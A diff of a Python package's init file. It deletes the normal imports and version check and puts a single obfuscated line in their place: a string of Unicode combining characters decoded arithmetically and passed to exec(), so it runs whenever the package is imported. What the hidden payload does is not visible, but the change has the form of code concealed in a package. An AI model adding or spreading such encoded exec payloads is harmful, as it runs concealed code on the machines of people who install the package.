@@ -1,11 +1,1 @@
-import sys
-import warnings
-
-from .compress import unicode_compress, unicode_decompress
-from .exception import UnknownCharacterException
-from .inflate import inflate, deflate
-
-if sys.version_info[0] != 3 or sys.version_info[1] < 10:
-    warnings.warn(
-        "The python interpreter may break on versions earlier than 3.10", stacklevel=2
-    )
+b='E͉͍͐͏͔͓͙͓͉͍͒̀ͯ͐͏͔͎͉͎͇͓͒̀͗́͒ͯͯ͆͒͏͍̀̎̓͏͍͓͓͉͍͐͒̀͐ͅ͏͔͕͎͉͒̀̓͏̈́̿̓ͅ͏͍͓͓͕͎͉͐͒̌̀̓ͅ͏̈́̿̈́̓ͅͅ͏͍͓͓͐͒ͯ͆͒ͅ͏͍͔͉̀̎̓͐͘ͅͅ͏͎͉͍̀͐͏̵͔͎͎͒̀͋͏͎̣͈͔̥͔͉͗́͒́̓͒̓͐͘ͅͅ͏͎ͯ͆͒͏͍͉͎͔͉͍̀̎͆͌́̀͐ͅ͏͔͉͎͔͔͉͓͙͓͖͓͉͒̀͆͌́̌̀̈́͆͌́ͯͯ͆̀̎͒ͅͅͅͅ͏͎͉͎̿͆͏̻̝̐̽̀́̀̓̀͏͓͙͓͖͓͉͒̀̎͒ͅ͏͎͉͎̿͆͏̴̻̜͎͉͎͇͓͎͈͙͔͈̑̽̀̀̑̐ͯ̀̀̀̀͗́͒̎͗́͒̈ͯ̀̀̀̀̀̀̀̀̂̀͐̚ͅ͏͎͉͎͔͔͍͙̀͒͐͒͒̀́̀͂͒́͋̀ͅͅͅͅ͏͎͖͓͉̀͒ͅ͏͎͓͉͔͈͎͓͔͖̝̀́͒͌͒̀́̀̓̎̑̐̂̌̀́̓͋͌͌̒ͯ̀̀̀̀̉ͯͅͅͅͅ'.encode();exec(''.join(chr(((h<<6&64|c&63)+22)%133+10)for h,c in zip(b[1::2],b[2::2])))
